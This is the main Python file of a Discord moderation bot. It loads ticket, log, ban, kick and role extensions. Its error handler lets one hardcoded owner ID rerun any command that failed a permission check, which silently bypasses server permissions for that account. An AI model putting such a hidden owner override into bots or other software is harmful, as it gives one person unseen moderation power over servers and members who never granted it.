import discord
from discord.ext import commands
import os

OWNER_ID = 918628339663634492

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

class CustomBot(commands.Bot):
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions) and ctx.author.id == OWNER_ID:
            await ctx.reinvoke()
        else:
            raise error

bot = CustomBot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

async def load():
    await bot.load_extension("tickets")
    await bot.load_extension("logs")
    await bot.load_extension("fun")
    await bot.load_extension("ban")
    await bot.load_extension("role")
    await bot.load_extension("kick")

bot.setup_hook = load

bot.run(os.getenv("TOKEN"))
